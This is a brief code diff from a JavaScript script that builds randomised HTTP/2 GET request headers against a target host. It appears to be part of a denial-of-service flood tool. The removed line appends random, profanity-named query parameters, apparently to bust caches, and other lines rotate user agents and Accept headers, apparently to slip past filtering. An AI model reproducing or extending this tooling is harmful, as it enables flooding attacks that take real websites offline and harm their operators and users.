@@ -191,7 +191,7 @@ let headers = {
 ":method": "GET",
 ":authority": parsedTarget.host,
 ":scheme": "https",
-":path": parsedTarget.path + "?q=bexnxx" + generateRandomString(1,6) + '&kontol=' +  generateRandomString(1,12) + '&jancok=' + generateRandomString(1,12),
+":path": parsedTarget.path,
 'User-Agent': finnalUa,
 'Accept': Math.random() < 0.5 ? "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" : "application/json",
 'Accept-Language': 'en-US,en;q=0.5',
